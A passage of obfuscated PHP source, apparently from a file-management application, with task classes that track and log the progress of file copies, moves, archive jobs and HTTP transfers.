$›Ì©—°[$ı¾Î½·È[32]]) { $¨¤ÑŸ¤®->rename($„Ç×¬±ç, $âÏ«û”Æ); } $¨¤ÑŸ¤®->where($èĞë¬ÂÚ)->setField($ı¾Î½·È[525], 0); $êúßìÔ->eventRecycle($„Ç×¬±ç, $ı¾Î½·È[2467]); } } } goto bè×¥Á‘Ôß; EŒßÚùÇÅ’: class TaskFileTransfer extends Task { protected function startAfter() { $ôõ£é¨ =& $_SERVER[áäÒ½¯Ç]; $™²óÑ”Ä =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ôõ£é¨[1957], array($this, $ôõ£é¨[1958])); Hook::bind($ôõ£é¨[1360], array($this, $ôõ£é¨[1959])); Hook::bind($ôõ£é¨[1960], array($this, $ôõ£é¨[1961])); Hook::bind($ôõ£é¨[696], array($this, $ôõ£é¨[1962])); Hook::bind($ôõ£é¨[697], array($this, $ôõ£é¨[1963])); Hook::bind($ôõ£é¨[703], array($this, $ôõ£é¨[1964])); Hook::bind($ôõ£é¨[704], array($this, $ôõ£é¨[1965])); Hook::bind($ôõ£é¨[699], array($this, $ôõ£é¨[1966])); Hook::bind($ôõ£é¨[701], array($this, $ôõ£é¨[1967])); Hook::bind($ôõ£é¨[665], array($this, $ôõ£é¨[1968])); Hook::bind($ôõ£é¨[662], array($this, $ôõ£é¨[1968])); Hook::bind($ôõ£é¨[667], array($this, $ôõ£é¨[1968])); Hook::bind($ôõ£é¨[669], array($this, $ôõ£é¨[1968])); Hook::bind($ôõ£é¨[671], array($this, $ôõ£é¨[1968])); Hook::bind($ôõ£é¨[1969], array($this, $ôõ£é¨[1970])); Hook::bind($ôõ£é¨[687], array($this, $ôõ£é¨[1971])); $this->sourceModelCopyFlag = !1; Hook::bind($ôõ£é¨[1972], array($this, $ôõ£é¨[1973])); Hook::bind($ôõ£é¨[1974], array($this, $ôõ£é¨[1975])); Hook::bind($ôõ£é¨[1976], array($this, $ôõ£é¨[1977])); $™²óÑ”Ä[$ôõ£é¨[1978]] = LNG($ôõ£é¨[1979]); $™²óÑ”Ä[$ôõ£é¨[1980]] = 0; $™²óÑ”Ä[$ôõ£é¨[1981]] = 0; $™²óÑ”Ä[$ôõ£é¨[1180]] = $ôõ£é¨[12]; $™²óÑ”Ä[$ôõ£é¨[1982]] = $ôõ£é¨[12]; $™²óÑ”Ä[$ôõ£é¨[1983]] = 0; $™²óÑ”Ä[$ôõ£é¨[1984]] = 0; $™²óÑ”Ä[$ôõ£é¨[1985]] = 0; if (!$™²óÑ”Ä[$ôõ£é¨[1815]]) { $™²óÑ”Ä[$ôõ£é¨[1815]] = LNG($ôõ£é¨[1986]); } } protected function endAfter() { $›Î§ğÂ =& $_SERVER[áäÒ½¯Ç]; Hook::unbind($›Î§ğÂ[1957], array($this, $›Î§ğÂ[1958])); Hook::unbind($›Î§ğÂ[1360], array($this, $›Î§ğÂ[1959])); Hook::unbind($›Î§ğÂ[1960], array($this, $›Î§ğÂ[1961])); Hook::unbind($›Î§ğÂ[696], array($this, $›Î§ğÂ[1962])); Hook::unbind($›Î§ğÂ[697], array($this, $›Î§ğÂ[1963])); Hook::unbind($›Î§ğÂ[703], array($this, $›Î§ğÂ[1964])); Hook::unbind($›Î§ğÂ[704], array($this, $›Î§ğÂ[1965])); Hook::unbind($›Î§ğÂ[699], array($this, $›Î§ğÂ[1966])); Hook::unbind($›Î§ğÂ[701], array($this, $›Î§ğÂ[1967])); Hook::unbind($›Î§ğÂ[665], array($this, $›Î§ğÂ[1968])); Hook::unbind($›Î§ğÂ[662], array($this, $›Î§ğÂ[1968])); Hook::unbind($›Î§ğÂ[667], array($this, $›Î§ğÂ[1968])); Hook::unbind($›Î§ğÂ[669], array($this, $›Î§ğÂ[1968])); Hook::unbind($›Î§ğÂ[671], array($this, $›Î§ğÂ[1968])); Hook::unbind($›Î§ğÂ[1969], array($this, $›Î§ğÂ[1970])); Hook::unbind($›Î§ğÂ[687], array($this, $›Î§ğÂ[1971])); Hook::unbind($›Î§ğÂ[1972], array($this, $›Î§ğÂ[1973])); Hook::unbind($›Î§ğÂ[1974], array($this, $›Î§ğÂ[1975])); Hook::unbind($›Î§ğÂ[1976], array($this, $›Î§ğÂ[1977])); } public function copyMoveStart($É‘—‡­, $¡öõªš÷, $Ø§’Óèğ, $¿‡…ÕÕ) { $€Ê½Šô× =& $_SERVER[áäÒ½¯Ç]; self::log($€Ê½Šô×[1987] . $¡öõªš÷ . $€Ê½Šô×[73] . $¿‡…ÕÕ); $­Ğé“àó = rtrim(TEMP_FILES, $€Ê½Šô×[8]); if (substr($¡öõªš÷, 0, strlen($­Ğé“àó)) == $­Ğé“àó) { return; } if (substr($¿‡…ÕÕ, 0, strlen($­Ğé“àó)) == $­Ğé“àó) { return; } $¬Ò‹Ô—ì =& $this->task; $¬Ò‹Ô—ì[$€Ê½Šô×[1988]] = KodIO::transferType($É‘—‡­, $Ø§’Óèğ); self::log($€Ê½Šô×[1989] . $¬Ò‹Ô—ì[$€Ê½Šô×[1988]] . $€Ê½Šô×[74] . $¡öõªš÷ . $€Ê½Šô×[73] . $¿‡…ÕÕ); $this->update(); } public function updateAfter() { $øÚáŠŸï =& $_SERVER[áäÒ½¯Ç]; $–õŸıï• =& $this->task; if (!$–õŸıï•[$øÚáŠŸï[866]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($–õŸıï•[$øÚáŠŸï[1988]] == $øÚáŠŸï[1463]) { return; } self::updateTask($–õŸıï•); } private static function updateTask(&$€¨¬ØıÙ) { $”Œ›ó‰ë =& $_SERVER[áäÒ½¯Ç]; if ($€¨¬ØıÙ[$”Œ›ó‰ë[1988]] == $”Œ›ó‰ë[1331] || $€¨¬ØıÙ[$”Œ›ó‰ë[1988]] == $”Œ›ó‰ë[108]) { if ($€¨¬ØıÙ[$”Œ›ó‰ë[1982]]) { $€¨¬ØıÙ[$”Œ›ó‰ë[1985]] = $€¨¬ØıÙ[$”Œ›ó‰ë[1984]] + $€¨¬ØıÙ[$”Œ›ó‰ë[1981]]; } } else { if ($€¨¬ØıÙ[$”Œ›ó‰ë[1988]] == $”Œ›ó‰ë[1464]) { if ($€¨¬ØıÙ[$”Œ›ó‰ë[1982]] == $”Œ›ó‰ë[1331]) { $€¨¬ØıÙ[$”Œ›ó‰ë[1985]] = $€¨¬ØıÙ[$”Œ›ó‰ë[1984]] + $€¨¬ØıÙ[$”Œ›ó‰ë[1981]] * 0.5; } else { if ($€¨¬ØıÙ[$”Œ›ó‰ë[1982]] == $”Œ›ó‰ë[108]) { $€¨¬ØıÙ[$”Œ›ó‰ë[1985]] = $€¨¬ØıÙ[$”Œ›ó‰ë[1984]] + $€¨¬ØıÙ[$”Œ›ó‰ë[1980]] * 0.5 + $€¨¬ØıÙ[$”Œ›ó‰ë[1981]] * 0.5; } } } } $€¨¬ØıÙ[$”Œ›ó‰ë[1928]] = $€¨¬ØıÙ[$”Œ›ó‰ë[1985]] / $€¨¬ØıÙ[$”Œ›ó‰ë[866]]; if ($€¨¬ØıÙ[$”Œ›ó‰ë[1928]] > 0) { $öé¯è›Ñ = timeFloat() - $€¨¬ØıÙ[$”Œ›ó‰ë[1930]] - $€¨¬ØıÙ[$”Œ›ó‰ë[1933]]; $€¨¬ØıÙ[$”Œ›ó‰ë[1934]] = $öé¯è›Ñ * (1 - $€¨¬ØıÙ[$”Œ›ó‰ë[1928]]) / $€¨¬ØıÙ[$”Œ›ó‰ë[1928]]; } $Äì°Öª = $€¨¬ØıÙ[$”Œ›ó‰ë[1981]] . $”Œ›ó‰ë[949] . $€¨¬ØıÙ[$”Œ›ó‰ë[1980]] . "\x3b\40{$¹ä‘³öŠ}\73" . $€¨¬ØıÙ[$”Œ›ó‰ë[1985]]; self::log($”Œ›ó‰ë[1990] . $€¨¬ØıÙ[$”Œ›ó‰ë[1982]] . $”Œ›ó‰ë[74] . $€¨¬ØıÙ[$”Œ›ó‰ë[1928]] . $”Œ›ó‰ë[74] . $Äì°Öª); } public function addPath($š€ÔÇá˜) { $ÒäÀ©±É =& $_SERVER[áäÒ½¯Ç]; if (!$š€ÔÇá˜) { return; } $¼¿Ï¯¾é =& $this->task; $×—”®¡¥ = IO::infoWithChildren($š€ÔÇá˜); $ÅšÛá¨ = $¼¿Ï¯¾é[$ÒäÀ©±É[1991]] ? $¼¿Ï¯¾é[$ÒäÀ©±É[1991]][$ÒäÀ©±É[1992]] : 0; $¼¿Ï¯¾é[$ÒäÀ©±É[1991]] = array($ÒäÀ©±É[1992] => $ÅšÛá¨ + 1, $ÒäÀ©±É[514] => $×—”®¡¥[$ÒäÀ©±É[32]], $ÒäÀ©±É[87] => $×—”®¡¥[$ÒäÀ©±É[87]], $ÒäÀ©±É[607] => $×—”®¡¥[$ÒäÀ©±É[607]] ? $×—”®¡¥[$ÒäÀ©±É[607]] : $×—”®¡¥[$ÒäÀ©±É[87]]); if ($×—”®¡¥[$ÒäÀ©±É[33]] == $ÒäÀ©±É[241]) { $¼¿Ï¯¾é[$ÒäÀ©±É[1178]] += 1; } else { $¼¿Ï¯¾é[$ÒäÀ©±É[1178]] += $×—”®¡¥[$ÒäÀ©±É[82]][$ÒäÀ©±É[80]]; if ($×—”®¡¥[$ÒäÀ©±É[192]]) { $¼¿Ï¯¾é[$ÒäÀ©±É[1178]] += $×—”®¡¥[$ÒäÀ©±É[82]][$ÒäÀ©±É[81]] + 1; } } $¼¿Ï¯¾é[$ÒäÀ©±É[866]] += $×—”®¡¥[$ÒäÀ©±É[79]]; $this->update(); self::log(array($ÒäÀ©±É[1993] . $š€ÔÇá˜, $×—”®¡¥)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Ù¶ß¬“ê) { } public function sourceAddHashEnd($œââŒœò) { } public function sourceAddFileStart($µ¢§úÏØ) { $„²íïª =& $_SERVER[áäÒ½¯Ç]; $Åñ³ñø =& $this->task; $Åñ³ñø[$„²íïª[1980]] = $µ¢§úÏØ[$„²íïª[79]]; $Åñ³ñø[$„²íïª[1978]] = $µ¢§úÏØ[$„²íïª[32]]; $Åñ³ñø[$„²íïª[1180]] = $µ¢§úÏØ[$„²íïª[32]]; $Åñ³ñø[$„²íïª[1994]] = $µ¢§úÏØ[$„²íïª[87]]; $this->update(); self::log($„²íïª[1995] . $µ¢§úÏØ[$„²íïª[87]] . $„²íïª[1996] . $µ¢§úÏØ[$„²íïª[79]]); } public function sourceAddFileEnd($±ñÇÉÃØ) { $Á®†˜±Ú =& $_SERVER[áäÒ½¯Ç]; $ô©™°™ò =& $this->task; $ô©™°™ò[$Á®†˜±Ú[1985]] += $±ñÇÉÃØ[$Á®†˜±Ú[79]]; $ô©™°™ò[$Á®†˜±Ú[1994]] = $±ñÇÉÃØ[$Á®†˜±Ú[87]]; $this->update(1); self::log($Á®†˜±Ú[1997] . $±ñÇÉÃØ[$Á®†˜±Ú[87]] . $Á®†˜±Ú[1996] . $±ñÇÉÃØ[$Á®†˜±Ú[79]] . $Á®†˜±Ú[1998]); } public function copyFileStart($™ßàşóõ, $È²”²Ş, $€¥ºÍÁ, $ÊÇ¶¤œ¸, $Ö¢ŞÁ£Ô, $×ãù·Òß) { $Öä¨À‘ú =& $_SERVER[áäÒ½¯Ç]; $şóíæ´ = $Ö¢ŞÁ£Ô; if ($şóíæ´ == $GLOBALS[$Öä¨À‘ú[1999]]) { $şóíæ´ = $GLOBALS[$Öä¨À‘ú[2000]]; } $GLOBALS[$Öä¨À‘ú[2000]] = $Ö¢ŞÁ£Ô; $GLOBALS[$Öä¨À‘ú[1999]] = $×ãù·Òß; $®ûµ¼†Ÿ =& $this->task; $®ûµ¼†Ÿ[$Öä¨À‘ú[1978]] = $şóíæ´; $®ûµ¼†Ÿ[$Öä¨À‘ú[1980]] = (int) $™ßàşóõ->size($È²”²Ş); $®ûµ¼†Ÿ[$Öä¨À‘ú[1981]] = 0; $®ûµ¼†Ÿ[$Öä¨À‘ú[1180]] = $Öä¨À‘ú[12]; $®ûµ¼†Ÿ[$Öä¨À‘ú[1982]] = $Öä¨À‘ú[12]; $®ûµ¼†Ÿ[$Öä¨À‘ú[1983]] = 0; $°Ğ—•Şƒ = $®ûµ¼†Ÿ[$Öä¨À‘ú[1980]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($®ûµ¼†Ÿ[$Öä¨À‘ú[492]] . $Öä¨À‘ú[2001]); if ($°Ğ—•Şƒ && file_exists(get_path_father($ÊÇ¶¤œ¸))) { Cache::set($®ûµ¼†Ÿ[$Öä¨À‘ú[492]] . $Öä¨À‘ú[2001], $ÊÇ¶¤œ¸); $®ûµ¼†Ÿ[$Öä¨À‘ú[1951]] = array($Öä¨À‘ú[2002], $Öä¨À‘ú[2003]); } $this->update(0, $°Ğ—•Şƒ); self::log("\143\157\x70\x79\106\x69\154\145\x53\x74\141\162\x74\72{$È²”²Ş}\x3b"); } public static function updateCopyLocalFileSize($°ıôëêª) { $›¹¥ˆï =& $_SERVER[áäÒ½¯Ç]; $¬Àéƒ–¾ = Cache::get($°ıôëêª[$›¹¥ˆï[492]] . $›¹¥ˆï[2001]); if (!$¬Àéƒ–¾ || !file_exists($¬Àéƒ–¾)) { return $°ıôëêª; } $°ıôëêª[$›¹¥ˆï[1981]] = @filesize($¬Àéƒ–¾); $°ıôëêª[$›¹¥ˆï[1985]] += $°ıôëêª[$›¹¥ˆï[1981]]; self::updateTask($°ıôëêª); return $°ıôëêª; } public function copyFileEnd($©×şóîÑ, $†Ø‰™‰ , $Á§€£Ï, $Âöú°Â¹, $é»»Å‰“, $…•ƒ™¯Ê) { $ôñçÃêË =& $_SERVER[áäÒ½¯Ç]; $³Å‘· =& $this->task; $³Å‘·[$ôñçÃêË[1981]] = $³Å‘·[$ôñçÃêË[1980]]; $³Å‘·[$ôñçÃêË[1982]] = $ôñçÃêË[12]; unset($³Å‘·[$ôñçÃêË[1951]]); if ($é»»Å‰“ == $³Å‘·[$ôñçÃêË[1978]]) { $³Å‘·[$ôñçÃêË[1984]] += $³Å‘·[$ôñçÃêË[1980]]; $³Å‘·[$ôñçÃêË[1985]] = $³Å‘·[$ôñçÃêË[1984]]; $¶Ê²ñ× = 1; if (isset($³Å‘·[$ôñçÃêË[1994]]) && $³Å‘·[$ôñçÃêË[1994]] == $†Ø‰™‰ ) { $¶Ê²ñ× = 0; } $this->update($¶Ê²ñ×); } else { $this->update(); $³Å‘·[$ôñçÃêË[1981]] = 0; } Cache::remove($³Å‘·[$ôñçÃêË[492]] . $ôñçÃêË[2001]); self::log($ôñçÃêË[2004] . $†Ø‰™‰  . $ôñçÃêË[73] . $Âöú°Â¹ . $ôñçÃêË[221] . $é»»Å‰“ . $ôñçÃêË[2005] . $³Å‘·[$ôñçÃêË[1978]]); } public function updateFileEnd($š¦Ş´şÙ, $Æ¼›ëÀ¦) { $©ŸÒÂ¥‡ =& $_SERVER[áäÒ½¯Ç]; $ëÏÀĞ³× =& $this->task; $ëÏÀĞ³×[$©ŸÒÂ¥‡[1978]] = $š¦Ş´şÙ; $ëÏÀĞ³×[$©ŸÒÂ¥‡[1980]] = $Æ¼›ëÀ¦; $ëÏÀĞ³×[$©ŸÒÂ¥‡[1984]] += $Æ¼›ëÀ¦; $ëÏÀĞ³×[$©ŸÒÂ¥‡[1985]] = $ëÏÀĞ³×[$©ŸÒÂ¥‡[1984]]; $this->update(1); self::log($©ŸÒÂ¥‡[2006] . $š¦Ş´şÙ); } public function sourceModelCopy($¶ÈˆˆÖ) { $ŸÜïÑœš =& $_SERVER[áäÒ½¯Ç]; $‹ÙˆŸš = $¶ÈˆˆÖ[0]; $ò‡«Ñ££ = $¶ÈˆˆÖ[1]; $Ï¡°Ÿ =& $this->task; $this->sourceModelCopyFlag = !0; $†êûá”ñ = 0; switch ($‹ÙˆŸš) { case $ŸÜïÑœš[663]: $†êûá”ñ = 1; break; case $ŸÜïÑœš[666]: $Ï¡°Ÿ[$ŸÜïÑœš[1978]] = $ò‡«Ñ££[$ŸÜïÑœš[32]]; break; case $ŸÜïÑœš[668]: $†êûá”ñ = intval($¶ÈˆˆÖ[$ŸÜïÑœš[476]] * 0.4); break; case $ŸÜïÑœš[670]: $†êûá”ñ = intval($¶ÈˆˆÖ[$ŸÜïÑœš[476]] * 0.2); break; case $ŸÜïÑœš[672]: $†êûá”ñ = intval($¶ÈˆˆÖ[$ŸÜïÑœš[476]] * 0.4); break; } $this->update($†êûá”ñ); self::log(array("{$‹ÙˆŸš}\x3b\x61\144\144\75{$†êûá”ñ}", $¶ÈˆˆÖ)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¬¤‹Ôş„, $œŠğ—¹š) { $‰ÂÒõïé =& $_SERVER[áäÒ½¯Ç]; $this->sourceModelCopyFlag = !0; $¿ê›€ÊÅ = 1; if (isset($¬¤‹Ôş„[$‰ÂÒõïé[82]])) { $¿ê›€ÊÅ = $¬¤‹Ôş„[$‰ÂÒõïé[82]][$‰ÂÒõïé[80]]; $¿ê›€ÊÅ = $¿ê›€ÊÅ + $¬¤‹Ôş„[$‰ÂÒõïé[82]][$‰ÂÒõïé[81]] + 1; } $this->update($¿ê›€ÊÅ); $this->sourceModelCopyFlag = !1; $this->log(array($‰ÂÒõïé[2007], $¿ê›€ÊÅ, $¬¤‹Ôş„)); } public function sourceMove($ğ£¼Íş…) { $this->sourceRemove($ğ£¼Íş…, !1); } public function curlProgress($ßØë³‘ª, $ÀÏ”ÁƒÃ, $Á‡çé›Ü, $›ûñäÀ¼, $Ñü¦ „™) { $‹Î¼Ü¾Î =& $_SERVER[áäÒ½¯Ç]; $‡Ô¹üÊ‰ =& $this->task; if ($Ñü¦ „™ > 0) { $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1180]] = $‹Î¼Ü¾Î[2008]; $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1982]] = $‹Î¼Ü¾Î[108]; if ($‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1980]]) { $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1981]] = $Ñü¦ „™; } if ($‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1983]]) { $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1981]] = $Ñü¦ „™ + $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1983]]; } } else { if ($Á‡çé›Ü > 0) { if ($‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1980]] == $ÀÏ”ÁƒÃ) { $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1981]] = $Á‡çé›Ü; $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1180]] = $‹Î¼Ü¾Î[2009]; $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1982]] = $‹Î¼Ü¾Î[1331]; } } } $this->update(); $½äÒ¬² = "\x64\x6f\x77\156\72{$Á‡çé›Ü}\x2f{$ÀÏ”ÁƒÃ}\73\x20\x75\x70\x6c\157\x61\144\72{$Ñü¦ „™}\57{$›ûñäÀ¼}\73\146\x69\x6c\x65\x3d" . $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1980]]; self::log(array($‹Î¼Ü¾Î[2010] . $½äÒ¬² . $‹Î¼Ü¾Î[74] . $‡Ô¹üÊ‰[$‹Î¼Ü¾Î[1978]], curl_getinfo($ßØë³‘ª))); } public function curlProgressStart($ıÃ¡Ö™) { } public function curlProgressEnd($€§É×•İ) { $§òç€ºÂ =& $_SERVER[áäÒ½¯Ç]; $·ØÄÍ§„ =& $this->task; $ßò¯Ş€ş = curl_getinfo($€§É×•İ); $–‡…Ë–ò = $ßò¯Ş€ş[$§òç€ºÂ[2011]]; if ($–‡…Ë–ò == -1) { $–‡…Ë–ò = $ßò¯Ş€ş[$§òç€ºÂ[2012]]; } if ($·ØÄÍ§„[$§òç€ºÂ[1982]] == $§òç€ºÂ[108] && $–‡…Ë–ò) { $·ØÄÍ§„[$§òç€ºÂ[1983]] += $–‡…Ë–ò; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Ó­üïš =& $_SERVER[áäÒ½¯Ç]; $‡Í¡µ¦ç =& $this->task; $‡Í¡µ¦ç[$Ó­üïš[2013]] = 1; Hook::bind($Ó­üïš[1972], array($this, $Ó­üïš[2014])); Hook::bind($Ó­üïš[1974], array($this, $Ó­üïš[2015])); Hook::bind($Ó­üïš[1976], array($this, $Ó­üïš[2016])); } protected function endAfter() { $ÄÛİ¯Á =& $_SERVER[áäÒ½¯Ç]; Hook::unbind($ÄÛİ¯Á[1972], array($this, $ÄÛİ¯Á[2014])); Hook::unbind($ÄÛİ¯Á[1974], array($this, $ÄÛİ¯Á[2015])); Hook::unbind($ÄÛİ¯Á[1976], array($this, $ÄÛİ¯Á[2016])); } public function progressStart($Õû•©¢µ) { $ˆ·‰ƒƒ– =& $_SERVER[áäÒ½¯Ç]; $²ŒÊà¨Í = curl_getinfo($Õû•©¢µ); self::log($ˆ·‰ƒƒ–[2017] . $²ŒÊà¨Í[$ˆ·‰ƒƒ–[392]]); self::valueSet($this->task[$ˆ·‰ƒƒ–[492]], $this->task); } public function progressEnd($şƒ£Ä) { $ıÊ½œ•• =& $_SERVER[áäÒ½¯Ç]; self::log($ıÊ½œ••[2018] . $this->task[$ıÊ½œ••[492]]); $this->end(); } public function progress($ƒÛãÄ‘, $¬øªŸĞú, $¸°‹Î‚Û, $´èì­Ó, $ê›ÈúœË) { $„®Û¹£ =& $_SERVER[áäÒ½¯Ç]; $³£Õ’ßÒ =& $this->task; if ($ê›ÈúœË > 0) { $³£Õ’ßÒ[$„®Û¹£[1178]] = $³£Õ’ßÒ[$„®Û¹£[1178]] == 0 ? $´èì­Ó : $³£Õ’ßÒ[$„®Û¹£[1178]]; $³£Õ’ßÒ[$„®Û¹£[1927]] = $ê›ÈúœË; } else { if ($¸°‹Î‚Û > 0) { $³£Õ’ßÒ[$„®Û¹£[1178]] = $³£Õ’ßÒ[$„®Û¹£[1178]] == 0 ? $¬øªŸĞú : $³£Õ’ßÒ[$„®Û¹£[1178]]; $³£Õ’ßÒ[$„®Û¹£[1927]] = $¸°‹Î‚Û; } } $this->update(); self::log("\160\x72\157\147\x72\145\163\163\110\x74\164\x70\72\x64\157\x77\x6e\72{$¸°‹Î‚Û}\x2f{$¬øªŸĞú}\x3b\x20\x75\160\154\x6f\x61\x64\x3a{$ê›ÈúœË}\x2f{$´èì­Ó}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($”•èµÒÂ, $Şù†ˆŞš = '', $ûïş‡£ = 0, $•ş‹‹şş = '') { $¿ªÉôÀ =& $_SERVER[áäÒ½¯Ç]; $•ş‹‹şş = $•ş‹‹şş ? $•ş‹‹şş : ($Şù†ˆŞš ? $Şù†ˆŞš : $”•èµÒÂ); $Íëšı«Ä = new Task($”•èµÒÂ, $Şù†ˆŞš, $ûïş‡£, $•ş‹‹şş); $GLOBALS[$¿ªÉôÀ[2019] . $”•èµÒÂ] = new TaskLog($¿ªÉôÀ[1911], $Íëšı«Ä, $•ş‹‹şş); return $Íëšı«Ä; } public function __construct($Çñğè¦¡ = '', $±ŞÁÀÍ = '', $¿Ã·ö † = '') { $¿ÛÍÜÖ¬ =& $_SERVER[áäÒ½¯Ç]; if (!$Çñğè¦¡) { $Çñğè¦¡ = $¿ÛÍÜÖ¬[1911]; } $³„ºúÉ¼ = $Çñğè¦¡ . $¿ÛÍÜÖ¬[482] . rand_string(10); if (!$¿Ã·ö †) { $¿Ã·ö † = $Çñğè¦¡ . $¿ÛÍÜÖ¬[53] . $¿Ã·ö †; } switch ($Çñğè¦¡) { case $¿ÛÍÜÖ¬[1911]: if (!$±ŞÁÀÍ || !$±ŞÁÀÍ->task) { return echoLog($Çñğè¦¡ . $¿ÛÍÜÖ¬[2020]); } $“ÏÚĞºÜ = $±ŞÁÀÍ; $³„ºúÉ¼ = $“ÏÚĞºÜ->task[$¿ÛÍÜÖ¬[492]]; $Çñğè¦¡ = $“ÏÚĞºÜ->task[$¿ÛÍÜÖ¬[492]]; if (!$“ÏÚĞºÜ->task[$¿ÛÍÜÖ¬[1815]]) { $“ÏÚĞºÜ->task[$¿ÛÍÜÖ¬[1815]] = $¿Ã·ö † ? $¿Ã·ö † : $Çñğè¦¡; } break; case $¿ÛÍÜÖ¬[2021]: if (!$±ŞÁÀÍ) { return echoLog($Çñğè¦¡ . $¿ÛÍÜÖ¬[2022]); } $ÂÔë¤ñÀ = is_string($±ŞÁÀÍ) ? array($±ŞÁÀÍ) : $±ŞÁÀÍ; $“ÏÚĞºÜ = new TaskFileTransfer($³„ºúÉ¼, $Çñğè¦¡, 0, $¿Ã·ö † ? $¿Ã·ö † : $ÂÔë¤ñÀ[0]); foreach ($ÂÔë¤ñÀ as $¡ã‹ùØö) { $“ÏÚĞºÜ->addPath($¡ã‹ùØö); } break; case $¿ÛÍÜÖ¬[398]: if (!$±ŞÁÀÍ) { return echoLog($Çñğè¦¡ . $¿ÛÍÜÖ¬[2022]); } $ÂÔë¤ñÀ = is_string($±ŞÁÀÍ) ? array($±ŞÁÀÍ) : $±ŞÁÀÍ; $“ÏÚĞºÜ = new TaskZip($³„ºúÉ¼, $Çñğè¦¡, 0, $¿Ã·ö † ? $¿Ã·ö † : $ÂÔë¤ñÀ[0]); foreach ($ÂÔë¤ñÀ as $¡ã‹ùØö) { $“ÏÚĞºÜ->addPath($¡ã‹ùØö); } break; case $¿ÛÍÜÖ¬[1351]: if (!$±ŞÁÀÍ) { return echoLog($Çñğè¦¡ . $¿ÛÍÜÖ¬[2022]); } $“ÏÚĞºÜ = new TaskUnZip($³„ºúÉ¼, $Çñğè¦¡, 0, $¿Ã·ö † ? $¿Ã·ö † : $±ŞÁÀÍ); if ($±ŞÁÀÍ) { $“ÏÚĞºÜ->addFile($±ŞÁÀÍ); } break; case $¿ÛÍÜÖ¬[150]: $“ÏÚĞºÜ = new TaskHttp($³„ºúÉ¼, $Çñğè¦¡); break; default: return; break; } $this->task = $“ÏÚĞºÜ; $this->taskID = $³„ºúÉ¼; Hook::bind($¿ÛÍÜÖ¬[1947], array($this, $¿ÛÍÜÖ¬[2023])); Hook::bind($¿ÛÍÜÖ¬[1949], array($this, $¿ÛÍÜÖ¬[2024])); Hook::bind($¿ÛÍÜÖ¬[1943], array($this, $¿ÛÍÜÖ¬[2025])); echoLog($¿ÛÍÜÖ¬[2026] . $“ÏÚĞºÜ->task[$¿ÛÍÜÖ¬[1815]]); } public function __destruct() { $this->end(); } public function end($ê©à¤… = '') { $©àéºï‘ =& $_SERVER[áäÒ½¯Ç]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ê©à¤…); $this->task = !1; $this->taskID = !1; Hook::unbind($©àéºï‘[1947], array($this, $©àéºï‘[2023])); Hook::unbind($©àéºï‘[1949], array($this, $©àéºï‘[2024])); Hook::unbind($©àéºï‘[1943], array($this, $©àéºï‘[2025])); } public function taskUpdate($Àƒ¸‰”«) { $ô¡şáÉ’ =& $_SERVER[áäÒ½¯Ç]; if (!$Àƒ¸‰”« || $this->taskID != $Àƒ¸‰”«[$ô¡şáÉ’[492]]) { return; } $˜ó—ŞŸà = 20; $¸ªÃî¹ = intval($Àƒ¸‰”«[$ô¡şáÉ’[1928]] * $˜ó—ŞŸà); $î°”¯Êİ = $ô¡şáÉ’[174] . str_repeat($ô¡şáÉ’[473], $¸ªÃî¹) . $ô¡şáÉ’[1130] . str_repeat($ô¡şáÉ’[53], $˜ó—ŞŸà - $¸ªÃî¹) . $ô¡şáÉ’[176]; $è®ââà™ = $î°”¯Êİ . sprintf($ô¡şáÉ’[2027], $Àƒ¸‰”«[$ô¡şáÉ’[1928]] * 100) . $ô¡şáÉ’[2028]; $ı«Ñî©î = $è®ââà™ . $Àƒ¸‰”«[$ô¡şáÉ’[1927]] . $ô¡şáÉ’[8] . $Àƒ¸‰”«[$ô¡şáÉ’[1178]] . LNG($ô¡şáÉ’[2029]); $Œ ‚şğ’ = $ô¡şáÉ’[12]; if ($Àƒ¸‰”«[$ô¡şáÉ’[2013]]) { $ı«Ñî©î = $è®ââà™ . size_format($Àƒ¸‰”«[$ô¡şáÉ’[1927]]) . $ô¡şáÉ’[8] . size_format($Àƒ¸‰”«[$ô¡şáÉ’[1178]]); $Œ ‚şğ’ = size_format($Àƒ¸‰”«[$ô¡şáÉ’[1929]]) . $ô¡şáÉ’[2030]; } if ($Àƒ¸‰”«[$ô¡şáÉ’[1180]]) { $Àƒ¸‰”«[$ô¡şáÉ’[1978]] = $Àƒ¸‰”«[$ô¡şáÉ’[1180]] . $ô¡şáÉ’[53] . $Àƒ¸‰”«[$ô¡şáÉ’[1978]]; } if ($Àƒ¸‰”«[$ô¡şáÉ’[1978]]) { $ÖŠîÖäû = $ô¡şáÉ’[12]; if ($Àƒ¸‰”«[$ô¡şáÉ’[1980]]) { $ÖŠîÖäû = $ô¡şáÉ’[50] . size_format($Àƒ¸‰”«[$ô¡şáÉ’[1981]]) . $ô¡şáÉ’[8] . size_format($Àƒ¸‰”«[$ô¡şáÉ’[1980]]); } $Œ ‚şğ’ .= $Àƒ¸‰”«[$ô¡şáÉ’[1978]] . $ÖŠîÖäû; } if ($Àƒ¸‰”«[$ô¡şáÉ’[866]] && !$Àƒ¸‰”«[$ô¡şáÉ’[1980]]) { $Œ ‚şğ’ .= $ô¡şáÉ’[53] . size_format($Àƒ¸‰”«[$ô¡şáÉ’[1985]]) . $ô¡şáÉ’[8] . size_format($Àƒ¸‰”«[$ô¡şáÉ’[866]]); } echoLog($ı«Ñî©î . $ô¡şáÉ’[53] . $Œ ‚şğ’, !0); } public function 